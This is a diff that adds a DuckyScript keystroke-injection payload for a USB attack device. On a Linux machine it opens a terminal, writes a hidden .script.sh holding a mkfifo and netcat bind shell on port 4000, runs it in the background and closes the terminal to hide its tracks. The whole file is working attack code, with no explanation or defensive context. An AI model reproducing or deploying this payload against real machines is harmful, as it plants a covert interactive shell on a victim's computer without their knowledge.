@@ -1,0 +1,21 @@
+
+DELAY  500
+CTRL-ALT T
+DELAY 400
+ENTER
+DELAY 300
+STRING rm .script.sh
+ENTER
+STRING touch .script.sh
+ENTER
+STRING echo "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/bash -i
+2>&1 | nc -l 127.0.0.1 4000 > /tmp/f \n" >> .script.sh
+ENTER
+STRING chmod +x .script.sh
+ENTER
+STRING ./.script.sh ; bg
+ENTER
+CTRL z
+DELAY 200
+STRING exit
+ENTER
